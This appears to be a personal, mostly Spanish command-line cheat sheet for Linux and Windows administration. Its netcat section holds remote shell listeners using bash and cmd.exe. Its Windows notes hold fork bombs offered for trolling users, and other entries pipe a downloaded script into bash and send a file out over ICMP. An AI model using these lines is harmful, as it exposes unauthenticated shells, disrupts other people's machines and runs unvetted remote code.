if (len(sys.argv) > 1):
    f = open(sys.argv[1],'w')
else:
    f = open(raw_input('Se guardara en: '),'w')

print "Descargando lista de proxy's..."
c = pycrawler.crawler()
site = c.crawlsite('proxy.org')

# Se buscan los proxys en la pagina
for e in site.element_list:
    if (e.tag_type == "option") and ('value' in e.property):
        if ("." in e.property['value']):
            print "->",e.property['value']
            f.write(e.property['value']+"\n")

f.close()

#############################################################################################################################################################################################

#### server http cgi smtp python ####

python -m SimpleHTTPServer

#### iniciar un servidor cgi en python util para probar scripts ####

python2 -m CgiHTTPServer

#### iniciar linconnect ####

python .linconnect/linconnectserver/main/linconnect_server.py

#### server smtp ####

python -m smtpd -n <HOST_SMTP>:<PUERTO_SMTP> <RELAY_SMTP>:<PUERTO_RELAY_SMTP>

# ejemplo #

python -m smtpd -n localhost:1125 smtp-relay:25

# A partir de este momento podemos conectarnos a nuestro SMTP local y enviar mensajes haciendo relay contra smtprelay: #

telnet localhost 1125
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 lab01 Python SMTP proxy version 0.2
mail from: test@foo.com
250 Ok
rcpt to: test@bar.com
250 Ok
data
Subject: Correo de prueba

Esto es una prueba
.
250 Ok
quit

# crear un servidor SMTP falso para poder probar que el envio de correos de una aplicacion esta funcionando sin tener que enviar realmente el correo. Tenemos que pasar el parametro "DebuggingServer". Esto hace que los correos que enviemos a traves de nuestro SMTP simplemente se muestren en la salida estandar (cuerpo y cabeceras simples del correo):

# Levantamos el SMTP #

python -m smtpd -n -c DebuggingServer localhost:1125

# Enviamos el correo: #

telnet localhost 1125
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
220 lab01 Python SMTP proxy version 0.2
mail from: test@foo.com
250 Ok
rcpt to: test@bar.com
250 Ok
data
Subject: Correo de prueba

Esto es una prueba
.
250 Ok
quit

# Y vemos en STDOUT lo siguiente: #

---------- MESSAGE FOLLOWS ----------
Subject: Correo de prueba
Esto es una prueba
X-Peer: 127.0.0.1

------------ END MESSAGE ------------



#############################################################################################################################################################################################

############################################################################################# man ###########################################################################################

#### man

#### si tenemos mas de un manual de un mismo programa podemos indicarle a man que vea un manual en particular de la siguiente manera ####

man numero programa

following 8 sections are available in the man page

1 general commands
2 system calls
3 c library functions
4 special files (usually devices, those found in /dev) and drivers
5 file formats and conventions
6 games and screensavers
7 miscellaneous
8 system administration commands and daemons

#### documentacion jerarquia hierarquia de directorios utilizando man ####

man hier

#### crear un pdf desde un manpages ####

man -t `man -w grep` | ps2pdf - grep.pdf

#### para ver los manuales de los programas que tenemos instalados en el sistem utilizamos man ####

man programa

#### crear un pdf desde man ####

man -t gedit | ps2pdf - > gedit.pdf

#### con el parametro -f descripcion ayuda archivos de configuracion ####

man -f resolv.conf



####  notas ####

man "-k" (equivalente a apropos)  y "-f" (equivalente a whatis)

#############################################################################################################################################################################################

########################################################################################## wireshark ########################################################################################

#### wireshark

#### filtro wireshark ssl TCP #### 

tcp.port == 80 or tcp.port == 443



#############################################################################################################################################################################################

######################################################################################### xscreensaver ######################################################################################

#### xscreensaver

#### comando iniciar xcreensaver al inicio ####

xscreensaver -nosplash



#############################################################################################################################################################################################

############################################################################################ duff ###########################################################################################

#### duff

#### encontrar archivos duplicados ####

duff -r /carpeta/a/buscar/

#### encontrar archivos diplicados y borrarlos ####

duff -e0 -r /carpeta/a/revisar/ | xargs -0 rm



#############################################################################################################################################################################################

############################################################################################ gpg ############################################################################################

#### gpg

#### cifrar archivos con gpg ####

gpg -c archivo.txt

#### descifrar archivos con cifrados con gpg ####

gpg archivo.txt.gpg

#### generar llave publica ####

gpg --gen-key

#### using gpg to generate gpg files to be decipher by offlineimap and msmtp

gpg --default-recipient-self -e /path/to/plain/password

#### solucion error gpg error repositorios ppa ####

sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com <nuero_error>

#############################################################################################################################################################################################
 
############################################################################################# mkfs ##########################################################################################

#### mkfs

#### formatear en ext4 disco duro con mkfs ####

mkfs.ext4 -j -o extent -l "etiqueta" /dev/sdx

#### formatear en ext4 disco duro solido ssd con mkfs ####

mkfs.ext4 -j -o extent -l "etiqueta" -e discard /dev/sdx

#### formatear un disco a formato fat 32 "-f 32" ####

mkfs.fat -f 32 /dev/sdxx





#############################################################################################################################################################################################

############################################################################################ fsck ###########################################################################################

#### fsck

#### montar discos duros con permisos de lectura y escritura hfs mac osx if the drive was improperly unmounted or has otherwise become partially corrupted run fsck.hfsplus (provided here by jayson) as such: ####

fsck.hfsplus /dev/sdx####  ####

apt-get install hfsprogs ; mount -t hfsplus -o force,rw /dev/sdx#### /media/mntpoint ; mount -t hfsplus -o remount,force,rw /dev/sdx#### /mount/point

#### fsck al reiniciar ####

touch /forcefsck



#############################################################################################################################################################################################

########################################################################################## e4defrag #########################################################################################

#### e4defrag

#### utilidad para desfragmentar sistemas de archivos ext* ext2 ext3 ext4 ####

e4defrag /dev/sdxx



#############################################################################################################################################################################################

########################################################################################## dnscrypt #########################################################################################

#### dnscrypt

#### iniciar dnscrypt escuchando en la ip local en el puerto 40 ####

dnscrypt-proxy --local-address=127.0.0.1:40 --daemonize



#############################################################################################################################################################################################

########################################################################################### netcat ##########################################################################################

#### nc

#### chat encriptado para 5 users ####

server: ncat -vlm 5 --ssl --chat 9876

cliente: ncat --ssl localhost 9876

#### compartir servir un archivo en el puerto 80 con netcat ####

nc -v -l -p 80 < file.ext

#### netcat listening on port 567/TCP: ####

nc -l -p 567

#### connecting to that port from another machine: ####

nc 1.2.3.4 567

#### to pipe a text file to the listener: ####

cat infile | nc 1.2.3.4 567 -q 10

#### to have the listener save a received text file: ####

nc -l -p 567 > textfile

#### to transfer a directory, first at the receiving end set up ####

nc -l -p 678 | tar xvfpz 

#### then send the directory: ####

tar zcfp - /path/to/directory | nc -w 3 1.2.3.4 678

to send a message to your syslog server (the <0> means emerg): ####

"echo '<0>message' | nc -w 1 -u syslogger 514"

#### setting up a remote shell listener: ####

nc -v -e '/bin/bash' -l -p 1234 -t

or

nc l p 1234 e "c:\windows\system32\cmd.exe"

#### then telnet to port 1234 from elsewhere to get the shell. ####


#### using netcat to make an http http request ####

echo -e "get http://www.google.com http/1.0nn" | nc -w 5 www.google.com 80

#### making a one-page webserver; this will feed homepage.txt to all comers. ####

cat homepage.txt | nc -v -l -p 80

#### send files to another pc and pv for bar ptogress ####

tar -zcf - CentOS-7-x86_64-DVD-1503.iso | pv | nc -l -p 5555 -q 5

in the other pc:

nc 192.168.1.4 5555 | pv | tar -zxf -

#### Check if a single or multiple or a range of ports are open, see if the port 22 is open on the host 192.168.56.10

nc -zv 192.168.1.15 22  
-z – sets nc to simply scan for listening daemons, without actually sending any data to them
-v – enables verbose mode.

#### Check if ports 80, 22 and 21 are open on the remote host 192.168.5.10

nc -zv 192.168.56.10 80 22 21

#### It is also possible to specify a range of ports to be scanned:

nc -zv 192.168.56.10 20-80

#############################################################################################################################################################################################

############################################################################################ mac ############################################################################################

#### mac

#### actualizar y limpiar mac utilizando port ####

port selfupdate && port upgrade outdated && port clean --all installed && port -f uninstall inactive



#############################################################################################################################################################################################

########################################################################################### mount ###########################################################################################

#### mount

#### vemos el listado de dispositivos montados ####

mount

#### monta un dispositivo.(ya establecido en el fstab) ####

mount punto_montaje

#### para montar un sistema de archivos es recomendable primero crear una carpeta (mkdir carpeta) para luego montar el sistema de archivos alli dentro con mount por ejemplo ####

mount /dev/sdxx carpeta/

#### tambien podriamos editar el archivo fstab para automontar el sistema de archivos en la carpeta carpeta/ automaticamente cada vez que inciamos el sistema operativo mount asi ####

/dev/sdxx carpeta/ ext4 defaults 0 2

#### montar disco virtual vm ware con un sistema operativo windows  nota: assumes xp/2000/2003. for server 2008+ try offset=105,906,176 you can find this number in the system information utility under partition starting offset. uefi uefi based boxes you want partition 2 since the first is just the boot files (and fat fat). this works with (storage side) snapshots which is handy for single file restores on nfs nfs mounted vmware vmware systems ####

mount vmware-server-flat.vmdk /tmp/test/ -o ro,loop=/dev/loop1,offset=32768 -t ntfs

#### para montar una imagen iso iso, lo primero que vamos a crear es un punto de montaje (un directorio vacio) y luego vamos a utilizar el comando mount ####

mkdir /mnt/iso_image/ ; sleep 1 ; mount -o loop iso_image.iso /mnt/iso_image/

#### montar una imagen .iso en /mnt/ ####

mount -t iso9660 -o loop imagen.iso /mnt/   - umount /mnt/ para desmontar la imagen

#### con la opcion "unhide" podemos ver los archivos ocultos de haber alguno ####

mount -t iso9660 -ro unhide /dev/sdxx /mnt

#### re-montar particion raiz con permisos de lectura y escritura rw al inicia en recovery mode - how to mount the Ubuntu filesystem read-write when you have mounted the filesystem in recovery mode ####

mount -rw -o remount /



#### atime #### noatime #### relatime


# Atime, noatime y relatime son atributos que se pueden asignar a los sistemas de ficheros, directorios o ficheros en Linux y que definen el registro de los accesos a los ficheros/directorios.

# Cuando un sistema de ficheros está montado con el atributo atime (en muchas distribuciones por defecto), significa que cada vez que se acceda a un fichero o directorio, se realizará una escritura en el disco para guardar la fecha del último acceso al mismo. Esto implica un aumento considerable de I/O en la máquina y hay sistemas en los que puede conllevar una degradación del servicio bastante elevada. Por este motivo, muchas veces se recurre a deshabilitar este atributo, para ello debemos montar el filesystem con noatime.

# Existe otro atributo que se encuentra a mitad de camino entre atime y noatime, se trata de relatime (Ubuntu por ejemplo ya lo usa por defecto).  Relatime reduce considerablemente el refresco de la fecha de acceso ya que únicamente se modifica si el valor actual de atime es menor que la fecha de modificación del fichero. Esto es útil en el caso de que utilicemos aplicaciones que hagan uso del valor atime para ciertas tareas.

# Entrando en la parte práctica, haremos uso del fichero fstab (/etc/fstab), que es donde se listan los discos y particiones del sistema, para modificar este parámetro. Únicamente tendríamos que añadir en la sección de atributos (4ª columna) nuestra selección, en este caso relatime:

/dev/sda3  /              ext4         relatime,errors=remount-ro  0  1


# Posteriormente si queremos activar esta modificación, remontamos la partición, en este caso / #

mount -o remount /


# Y ya deberíamos visualizar los atributos del sistema de ficheros actualizados: #

mount

/dev/sda3 on / type ext4 (rw,relatime,errors=remount-ro)


# También podemos montarlo de forma temporal con relatime y pasándole todas las opciones que queramos (-o) sin modificar el fstab: #

mount -o remount,rw,relatime /


# Otro ejemplo, en este caso como noatime en /etc/fstab: #

UUID=8d76759b-8949-46d1-9dd6-eec549960ff0 /datos ext3 rw,noatime 0 0


# Conviene recordar también que podemos asignar estos atributos de forma independiente a ficheros o directorios, no tiene porque ser al sistema de ficheros completo: #

chattr +A fichero

lsattr fichero
-------A---------e- fichero


# Con el comando "stat" podremos verificar que pese a acceder al fichero no se modifica la fecha de acceso: #

stat fichero 

File: `fichero'
Size: 7         	Blocks: 8          IO Block: 4096   regular file
Device: 805h/2053d	Inode: 21242       Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/foo   Gid: ( 1000/foo)
Access: 2014-12-15 13:23:25.000482542 +0100
Modify: 2014-12-15 13:23:24.230482542 +0100
Change: 2014-12-15 13:23:24.280482542 +0100

# De este modo hemos deshabilitado atime para el fichero #


#############################################################################################################################################################################################

########################################################################################### fuseiso #########################################################################################

#### fuseiso

#### monta imagenes iso en forma directa sin necesidad de permisos de administrador ####

fuseiso source_imagefile.iso destination_directory/   - sudo mount -o rw,loop example.iso /media/example



#############################################################################################################################################################################################

########################################################################################### safecopy ########################################################################################

#### safecopy

#### safecopy crea imagenes iso desde medios danados ( se toma su tiempo pero funciona )



#############################################################################################################################################################################################

############################################################################################ dvd95 ##########################################################################################

#### dvd95

#### dvd95 convierte dvd de videos de doble capa a dvd de una capa ####



#############################################################################################################################################################################################

########################################################################################### md5sum ##########################################################################################

#### md5sum

#### generar la suma control md5 de un archivo ####

md5sum archivo.iso > archivo.iso.txt

#### verificar la suma control md5 de un archivo ####

md5sum -w -c archivo.iso.txt   - archivo.iso y archivo.iso.txt deben estar en el mismo directorio



#############################################################################################################################################################################################

########################################################################################### pidof ###########################################################################################

#### pidof

#### pidof es un comando que devuelve el pid del proceso especificado como argumento. para matar una aplicacion una aplicacion podemos usar: ####

kill -9 $(pidof process_name)

#### por ejemplo: ####

kill -9 $(pidof amarok)
kill -9 $(pidof firefox)

#### el primero mata a amarok, mientras que el segundo mata a firefox. ####



#############################################################################################################################################################################################

############################################################################################# wc ############################################################################################

#### wc 

#### wc nos muestra las lineas, palabras y caracteres en un archivo de texto  ####

#### wc es una herramienta de linea de comandos que devuelve el numero de lineas, palabras o caracteres en un archivo, dependiendo de que parametro se especifica en la linea de comandos. ####

#### para contar el numero de lineas: ####

wc -l input_file.txt

#### para contar el numero de palabras: ####

wc -w input_file.txt

#### y para contar el numero total de caracteres: ####

wc -c input_file.txt



#############################################################################################################################################################################################

############################################################################################# wget ##########################################################################################

#### wget

#### wget es una herramienta que nos permite realizar descargas de contenidos de servidores web de una forma muy sencilla y que soporta descargas mediante los protocolos http, https y ftp. a los administradores nos resulta tremendamente util, porque con ella podemos realizar descargas de archivos  almacenados en sitios web. ####

#### con wget es muy facil descargarnos el contenido del directorio raiz de una web y sus subdirectorios: ####

wget -r http://www.miweb.es/   - la opcion -r hace que se realice la descarga de forma recursiva.

#### y si queremos descargar la pagina web de forma que se pueda navegar por el sitio descargado en modo off-line, usamos la opcion -k, que convierte los enlaces en enlaces locales:

wget -k -r http://www.miweb.es/

#### por otra parte, podemos a indicar a wget el numero de niveles que debe descender en el arbol de directorios, mediante el parametro -l: ####

wget -r -l1 http://www.miweb.es/   - le estoy diciendo a wget que siga los enlaces, pero solo hasta 1 nivel, es decir, que no siga los enlaces encontrados en las paginas enlazadas.

#### puedo hacer que wget no siga enlaces a directorios padre, haciendo uso de la opcion -np: ####

wget -r -l1 -np http://www.miweb.es/

#### tambien puedo descargar un archivo de la web: ####

wget http://www.miweb.es/descargas/fotostoldap-0.1.deb

#### si por alguna razon, se cortara la descarga del archivo, no tendria que volver a descargarlo desde el principio. podria continuar la descarga usando la opcion -c: ####

wget -c http://www.miweb.es/descargas/fotostoldap-0.1.deb

#### puedo decirle a wget que me descargue tan solo determinados archivos, mediante la opcion -a. por ejemplo, si quisiera descargar tan solo los archivos .mp3 de un directorio concreto de una web, haria lo siguiente: ####

wget -r -l1 -a .mp3 http://www.miweb.es/descargas/

#### wget me va a descargar los archivos, pero me va a recrear la estructura de directorios donde se encuentran almacenados. si lo que me interesa es descargar tan solo los archivos, sin recrear la estructura de directorios donde se encuentran almacenados, no tengo mas que usar la opcion -nd: ####

wget -r -l1 -a .mp3 -nd http://www.miweb.es/descargas/   - con este comando se van a descargar todos los archivos .mp3 que haya.

#### si volviera a ejecutar wget y quisiera que solo se descargasen aquellos archivos que no estuvieran descargados ya, anadiria la opcion -nc a wget: ####

wget -r -l1 -a .mp3 -nd -nc http://www.miweb.es/descargas/

#### si se que mi wget va a descargar varios archivos y quiero asegurarme de que la descarga no se atascara en alguno de ellos, puedo usar la opcion -t para indicarle a web el numero de reintentos que debe hacer para descargar el archivo que esta fallando. por ejemplo, con -t1 puedo decirle a wget que si falla una descarga haga solo 1 reintento mas: ####

wget -r -l1 -a .mp3 -t1 -nd -nc http://www.miweb.es/descargas/

#### hay otra opcion que puede ser util para descargar archivos. la opcion -n. esta opcion descarga aquellos archivos que no existan ya en local con el mismo nombre, o aquellos que existan pero que fueran mas recientes que la copia local: ####

wget -r -l1 -a .mp3 -t1 -nd -n http://www.miweb.es/descargas/

#### un ejemplo que uso en ocasiones para descargar archivos .deb desde un servidor local, para despues instalarlos: ####

wget -r -l1 -a .deb -t1 -nd -n -np http://localhost/descargas/linux/

#### y un par de opciones mas que resultan utiles: podemos usar la opcion -b para descargar los archivos en el background: ####

wget -b -r -l1 -a .deb -t1 -nd -n -np http://localhost/descargas/linux/

#### o especificar los archivos que queremos descargar en un archivo de texto, con la opcion -i listadescargas.txt ####

wget -b -r -l1 -i urlsadescargar.txt -t1 -nd -n -np http://localhost/descargas/linux/

#############################################################################################################################################################################################

#### wget 2

#### descargar un archivo demasiado pesado (5gb, por ejemplo desde un sitio web): ####

wget http://pagina.com/carpeta/grandistrolinux.iso

#### pero... mientras estas descargando este archivo, repentinamente, puede que haya un apagon y tu computador pierda el hilo de lo que ha descargado, o momentaneamente el servidor desde donde lo estas bajando se cae. en estos casos seria mejor utilizar wget asi: ####

wget -c http://pagina.com/carpeta/grandistrolinux.iso   - con la opcion -c cualquier interrupcion en la descarga sera "resumida" en otro intento de descarga. de hecho, si existe parte de un archivo que se intento descargar sin la opcion -c, wget continuaria descargando el archivo pero guardandolo con otro nombre: grandistrolinux.iso.1

#### puedes tambien especificar el numero de reintentos que hara wget usando la opcion -tries. por ejemplo si quisieramos que el numero de intentos de descarga sea 8 podemos hacer lo siguiente: ####

wget -c --tries=8 http://pagina.com/carpeta/grandistrolinux.iso

wget -c -t 8 http://pagina.com/carpeta/grandistrolinux.iso

#### incluso, podemos especificar el nombre del archivo resultante, es decir, sino queremos que el archivo que descargamos tenga el nombre grandistrolinux.iso sino ditro.iso, podemos hacer esto: ####

wget -c --output-document=ditro.iso http://pagina.com/carpeta/grandistrolinux.iso

#### pero wget no solo descarga archivos desde una pagina web, puede usar tambien otros protocolos de comunicacion, como por ejemplo ftp: ####

wget -c --tries=10 ftp://pagina.com/carpeta/archivo.iso

#### puedes cambiar el estilo en el que se muestra de forma grafica el progreso de la descarga, asi: ####

wget -c --progress=dot http://pagina.com/carpeta/grandistrolinux.iso

#### tambien es posible configurar el limite de tasa de transferencia con wget usando la opcion --limit-rate, por ejemplo si queremos limitarlo a 100.5k por segundo ####

wget -c --limit-rate=100.5k http://pagina.com/carpeta/grandistrolinux.iso

#### de manera alternativa, la opcion limit rate se puede usar con numeros+sufijos asi: ####

wget -c --limit-rate=1m http://pagina.com/carpeta/grandistrolinux.iso

#### ademas, wget soporta el mecanismo de autenticacion http y ftp y puede ser usado asi: ####

wget -c --user=usuario --password=contrasenia http://pagina.com/carpeta/grandistrolinux.iso

wget -c --user=usuario --password=contrasenia ftp://72.29.83.102/archivo.odt

#### puedes usar wget ademas, para enviar cookies a sitios que puedan requerirlo asi: ####

wget --save-cookie cookies.txt --post-data 'name=cris&passwd=cami' "http://unsitio.net/auth.php"

#### y una vez autenticados con las cookies, como en ejemplo anterior, podemos proceder a descargar los archivos que necesitemos: ####

wget --load-cookies cookies.txt -p http://unsitio.net/carpeta/algo.php

#### tambien es posible usar "recursion". si deseas descargar todos los archivos desde una pagina web recursivamente usando wget, lo puedes hacer asi: ####

wget -r "http://localhost/iniciaraqui/"

#### tambien podrias indicarle que no cree directorios, cuando esta realizando descargas de manera recursiva... lo cual solamente descargara los archivos, asi: ####

wget -r -nd "http://localhost/iniciaraqui/"

#### descargar los dos primeros niveles o mas, de manera recursiva asi: ####

wget -r -l2 "http://localhost/iniciaraqui/"

#### es posible usar ademas algo muy similar a expresiones regulares en wget. esto se hace usando los caracteres especiales * ?. por ejemplo: ####

wget http://localhost/*.txt

wget ftp://dominio.com/pub/file??.vbs

wget http://dominio.com/pub/files??.*

wget -r "*.jpg" http://dominio.com/pub/

#### a la hora de descargar, por ejemplo, un archivo html... los links en su interior podrian apuntar al dominio del cual se descargaron. wget permite convertir los links dentro de los archivos html, a enlaces que apunten a archivos locales. esto es posible usando la opcion -k : ####

wget -k http://localhost/wordpress/

#### podemos ademas crear un archivo de log en wget, usando la opcion -o, asi: ####

wget -c -o /var/log/archivolog http://localhost/archivo.txt

#### tambien puedes correr wget en background asi: ####

wget -b http://localhost/archivo.txt

#### o si usas gnu/linux podria hacerse directamente desde la consola asi: ####

wget http://localhost/archivo.txt &

#### una de las opciones que mas me gustan de wget es la capacidad de leer urls de un archivo externo. para aprovechar esta funcion, puedes hacer: ####

wget -i lista-url.txt   - en este ejemplo no deberas escribir explicitamente la url en la linea de comandos por que las obtiene desde el archivo de texto

#### puedes obligar a wget a usar ipv6 o ipv4 usando las opciones -6 y -4, respectivamente. ademas, puedes deshabilitar el cache y las cookies usando las opciones --no-cache y --no-cookies. ####

#### en cuanto a descargas a traves de un proxy, puedes indicarle el usuario y password de autenticacion usando las opciones --proxy-user y --proxy-password, asi: ####

wget --proxy-user=usuario --proxy-password=contrasenia url

#### adicionalmente, wget tiene soporte para https (ssl/tls) usando los argumentos listados abajo: ####

--secure-protocol= (auto,sslv2,sslv3, tlsv1)
--certificate=archivo_certificado_cliente
--certificate-type= (pem,der)
--private-key=archivo_llave_privada
--private-key-type= (pem,der)
--ca-certificate=archivo_certificado
--ca-directory=directorio_fuente

#### la opcion --no-parent necesita ser especificada cuando se realicen descargas recursivas de tal manera que se evite la busqueda recursiva del directorio padre. ####

#############################################################################################################################################################################################

#### para especificar un nombre a un archivo que estemos por descargar con wget tenemos que pasarle el parametro -o asi ####

wget -O nombredelarchivo.zip http://www.archivoadescargar.com/archivo.zip

#### descargar sonido en .mp3 de pronunciacion de palabras en ingles ####

word="palabra lo que sea"; wget http://ssl.gstatic.com/dictionary/static/sounds/de/0/$word.mp3

#### descargar pagina web con wget ####

wget --mirror -p --convert-links -p /directorio/donde_se/guardara/ http://url_pagina_web

#### script informacion detallada alsa sonido util en irc para dar soporte ####

wget -O alsa-info.sh http://www.alsa-project.org/alsa-info.sh && chmod u+x ./alsa-info.sh && ./alsa-info.sh --upload

#### bajaria todos los archivos zip de una pagina web  ####

wget -a zip url

#### nos queremos descargar el manual nano.pdf que esta en http://www.manuales.com/informatica/editores/nano.pdf este comando nos bajaria solo el manual sin crearnos ningun nuevo directorio en nuestra home ####

wget -nh --cut-dirs=2 http://www.manuales.com/informatica/editores/nano.pdf

#### nos bajaria todo el contenido del curso (archivos .html,.css,.jpg,etc) al directorio /ortihuela ####

wget -r -nh http://usuarios.lycos.es/ortihuela/index.htm




#### notas ####

#### If having issues related to certificates use:

wget --no-check-certificate [link]

#### existe un front-end llamado gwget que nos permite manejar algunas de las opciones de wget ####

#### para ejecutar un script con wget podemos utilizar "-O -" con un pipe a "bash" para que al descargar el escript lo pase directamente a stdout y luego lo ejecute bash en vez de copiarlo al disco asi: ####

wget -O - https://www.dropbox.com/s/e00gqronjt3w3q2/gpg.sh | bash

wget https://www.dropbox.com/s/e00gqronjt3w3q2/gpg.sh && chmod u+x gpg.sh && sudo ./gpg.sh

#############################################################################################################################################################################################

############################################################################################## ps ###########################################################################################

#### ps

#### hilos y procesos de un usuario ####

ps -lf -u user

#### para listar ver todos los procesos corriendo en un sistema con ps hacemos ####

ps -ef | more

#### ver todos los procesos en un sistema ####

ps -eafw

#### ver todos los procesos de una manera jerarquica ####

ps -e -o pid,args --forest

#### saber cuando se inicio un proceso ####

ps -o lstart <pid_del_proceso>



#############################################################################################################################################################################################

########################################################################################### pstotext ########################################################################################

#### pstotext

#### visualiza archivos ps. ####

pstotext archivo.ps | less

#### visualiza archivos pdf. ####

pstotext archivo.pdf | less



#############################################################################################################################################################################################

########################################################################################### xpdf-utils ######################################################################################

#### pdftops #### pdftotext #### pdfimages

#### convierte un archivo pdf a ps. ####

pdftops archivo.pdf archivo.ps

#### convierte un archivo pdf a texto. ####

pdftotext -layout fich.pdf fich.txt    -   la opcion -layout hace que el documento de texto conserve lo mejor posible la disposicion fisica del documento pdf columnas saltos de linea etc

#### convierte un archivo pdf a html. ####

pdftotext -layout -htmlmeta fich.pdf fich.html

#### extraer las imagenes de un pdf ####

pdfimages archivo.pdf nombre_para_las_imagenes: pdfimages xmen.pdf xmen


#############################################################################################################################################################################################

############################################################################################ htmldoc ########################################################################################

#### htmldoc

#### convierte o une varios html en un pdf. ####

htmldoc --webpage fich1.html fich2.html -f suma.pdf

#### convierte o une varios html en un ps. ####

htmldoc --webpage fich1.html fich2.html -f suma.ps



#############################################################################################################################################################################################

########################################################################################### antiword ########################################################################################

#### antiword

#### visualiza un archivo doc. ####

antiword archivo.doc | less

#### convierte un archivo doc a ps con tamano folio. ####

antiword -p folio archivo.doc > archivo.ps

#### convierte un archivo doc a texto. ####

antiword -t -w 30 archivo.doc > archivo.txt    -p tambien puede ser a3,a4,a5,b4,etc    -w anchura de la linea en caracteres



#############################################################################################################################################################################################

############################################################################################# eyed3 #########################################################################################

#### eyed3

#### agragar cover art coverart a un archivo mp3 ####

eyed3 --add-image=coverart.jpg:front_cover musicfile.mp3



#############################################################################################################################################################################################

############################################################################################ nslookup #######################################################################################

#### nslookup

#### obtener la direccion ip desde un dominio ####

nslookup www.example.com | tail -2 | head -1 | awk '{print $2}'



#############################################################################################################################################################################################

############################################################################################# samba #########################################################################################

#### samba

#### resolucion de nombre de red bios ####

nbtscan ip_addr

#### resolucion de nombre de red bios ####

nmblookup -a ip_addr

#### mostrar acciones remotas de un host en windows ####

smbclient -l ip_addr/hostname

#### solucion nombre de archivos y carpetas raros ####

# It's a file name mangling problem. Samba is converting filenames down to old style DOS 8.3 filenames #

Edit /etc/smb.conf (*) and add mangled names=no to the [global] section and restart the smb service.


#### notas: ####

# podemos administrar un servidor samba de manera grafica con el paquete "swat" #


#############################################################################################################################################################################################

############################################################################################ windows ########################################################################################

#### windows

#### obtener la tabla de enrutado de nuestro router

route PRINT

#### The runas command in Windows allows a user to elevate their level of privileges to run a command as the Administrator user. The example below shows the usage of the runas command to open another cmd window as the Administrator user.

C:\Users\mike\Documents\openvpn>runas /user:Scott\Dobbo cmd
Enter the password for Scott\Dobbo:
Attempting to start cmd as user "Scott\Dobbo" ...

#### instalar servicios guindous windows powershell ####

ps c:\users\administrator> install-windowsfeature telnet-server

#### disabling mounting linux partition in windows 8 fastboot ####

powercfg /h off

#### windows agregar usuario a un grupo dominio ####

net group groupname username /add /domain

### iniciar detenet reiniciar y elimnar servicios en windows ####

#### iniciar un servicio ####

#### desde la linea de comandos ejecutamos: ####

net start servicio

#### por ejemplo, para iniciar el servicio de correo mailenable seria: ####

net start mailenable

#### parar un servicio ####

#### desde la linea de comandos ejecutamos: ####

net stop servicio

#### por ejemplo, para parar el servicio de correo mailenable seria: ####

net stop mailenable

#### pausar un servicio ####

#### desde la linea de comandos ejecutamos:  ####

net pause servicio

#### por ejemplo, para pausar el servicio de correo mailenable seria: ####

net pause mailenable

#### reanudar un servicio ####

#### desde la linea de comandos ejecutamos: ####

net continue servicio

#### por ejemplo, para reanudar el servicio de correo mailenable seria: ####

net continue mailenable

#### eliminar servicios ####

sc delete nombre_del_servicio

#### acelerar velocidad internet en windows ####

netsh int TCP set global congestionprovider=ctcp

#### comando takeown windows: permite que un administrador recupere el acceso a un archivo que anteriormente le era denegado, convirtiendo al administrador el propietario del archivo ####

takeown /a /r /f c:\somefolder

#### asignar, configurar, ver el estado de la red/ips locales en windows mediante cmd cmd ####

#### ver la configuracion de red windows cmd cmd ####

netsh interface ip show config

#### asignar un ip estatica windows cmd ####

netsh interface ip set address name="<nombre de la red a configurar>" static <ip local> <netmask> <gatewey> 1 --- "1 es un valor metrico"

#### asignar servidor dns en windows mediante cmd cmd ####

netsh interface ip set dns "<nombre de la red a asignarle el servidor dns>" static <ip del servidor dns>

#### obtener configuracion de red mediante dhcp dhcp en windows con el cmd cmd ####

netsh interface ip set address "<nobre de la red a configurar>" dhcp

#### obtener ip v4 windows ####

cls && ipconfig | find "ipv4"

#### How To Remove Shortcut Virus From Your Pendrive ####

Step 1. open the command prompt in Administrator mode. You can do that either by right click on command prompt as Run as Administrator

Step 2. connect your affected pen drive to the computer, after opening the command prompt. Now all you need to do is enter the command to convert your shortcut files into its original data.

Step 3. Enter the command – attrib -h -r -s /s /d D:\*.* Now in this command, the letter “D” is your pen drive name. And if your drive letter is H then command will be attrib -h -r -s /s /d H:\*.*

Step 4. Once you enter and run the command. All your shortcut files from the drive will be converted to normal files. You can delete all the unknown files from your drive when the command process is complete.

#### How To Remove Write Protection From Pendrive Or SD Card ####

Step 1. Press Windows Key + R then a Dialog box will appear.

Step 2. Now type Regedit and then hit the enter key that will open the Registry Editor.

Step 3. Now all you need to do is just move to “HKEY_LOCAL_MACHINE/SYSTEM/CurrentConrolSet/Control/StorageDevicePolicy” in the Registry Editor.

Step 4. After you complete the above step you will see a WriteProtect option. Now click on it and change its value to 0.


#### notas ####

# fork bombs para trollear usuarios de windows #

%0|%0


:s
start "loop.bat" %0
goto s


@echo off
:begin
echo Hello Mr Anderson.
goto begin


#############################################################################################################################################################################################

############################################################################################ hping3 #########################################################################################

#### hping3

#### enviar un archivo mediante ICMP con hping ####

hping3 10.0.2.254 --ICMP --sign msgid1 -d 50 -c 1 --file a_file   #### you need to start a listening hping on the reciever:

hping3 --listen 10.0.2.254 -i eth0 --sign msgid1



#############################################################################################################################################################################################

############################################################################################# ufw ###########################################################################################

#### ufw

#### abrir puerto ufw ####

ufw allow numero_del_puerto



#############################################################################################################################################################################################

######################################################################################### speaker-test ######################################################################################

#### speaker-test

#### comprobar canales de audio 4.0 5.1 7.1 ####

#### for 4.0 surround (two speakers in front, two in the back): ####

speaker-test -dplug:surround40 -c4 -l1 -twav

#### for 5.1: ####

speaker-test -dplug:surround51 -c6 -l1 -twav

#### for 7.1: ####

speaker-test -dplug:surround71 -c8 -l1 -twav



#############################################################################################################################################################################################

############################################################################################ getent #########################################################################################

#### getent

#### ver los miembros de un grupo ####

getent group <group>


#############################################################################################################################################################################################

############################################################################################ dmesg ##########################################################################################

#### dmesg

#### con dmesg podemos ver la salida que el kernel produjo en el arranque del sistema ####

#### ver errores en el kernel ring buffer ####

dmesg -xt -l err,crit,emerg

#### parametros utilies para dmesg, "-h" nos da una lectura mas facil de comprender (human readible) "-k" nos muestra la informacion relacionada con el kernel, "--level=err,warn" no filtrara$

dmesg -k --level=err,warn

#### some important log files

/var/log/message – Where whole system logs or current activity logs are available.
/var/log/auth.log – Authentication logs.
/var/log/kern.log – Kernel logs.
/var/log/cron.log – Crond logs (cron job).
/var/log/maillog – Mail server logs.
/var/log/boot.log – System boot log.
